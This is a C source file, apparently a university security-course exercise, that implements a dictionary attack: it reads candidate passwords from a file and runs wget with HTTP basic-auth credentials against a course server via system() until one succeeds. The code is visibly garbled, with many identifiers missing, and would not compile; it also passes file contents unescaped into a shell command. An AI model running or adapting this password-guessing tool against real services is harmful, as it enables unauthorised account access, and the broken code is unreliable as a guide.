#include<stdio.h>
#include<strings.h>
#include<stdlib.h>
#include<ctype.h>

#define MAX_SIZE 255


int CrackPasswd(FILE *fp)
{
   int i, cnt, flag;
   char string1[MAX_SIZE],string2[MAX_SIZE],[MAX_SIZE], passwd[MAX_SIZE];
   char fin;
   
   strcpy(string1,"wget http://sec-crack.cs.rmit.edu./SEC/2/");
   strcpy(string2," --http-user= --http-passwd='");
   strcpy(,"");

   while ((fin = fgetc(fp)) != EOF)
   {
      cnt = 0;
      
      for (i=0;i<MAX_SIZE;i++)
      {   
         passwd[i] = '\0';
         [i] = '\0';
      }
	 
      while(fin != '\n')
      {
	 passwd[cnt] = fin;
	 cnt++;
	 fin = fgetc(fp);
      } 
         
      if(strlen(passwd) <= 3)
      {
         strcat(, string1);
         strcat(, string2);
	 strcat(, passwd);
	 strcat(, "'");
	 printf("Sending Request as %s\n",);
	 flag = system();
	  
         if (flag == 0)
	 {
            printf("\nPassword is %s\n",passwd);
	    return 1;
	 }
         
	 strcpy(,""); 
         strcpy(passwd,"");
       }
    }
}  


int  (int argc, char *argv[])
{
   char *fname;
   FILE *fp;
   
   int , end;    
   
    = time();
    
   if (argc != 2)
   {
      fprintf(stdout,"Usage : ./Dictionary <dictionary>\n");
      return(EXIT_FAILURE);
   }
   
   fname = argv[1];
   
   if((fp = fopen(fname, "r")) == NULL)
   {
      fprintf(stderr,"Error : Failed  open %s for . \n",fname);
      return(EXIT_FAILURE);
   }
   
   CrackPasswd(fp);
  
   end = time(); 
   printf("Time Required = %lld msec\n",(end-)/());
   return (EXIT_SUCCESS);
  
}
     
	   
	  	
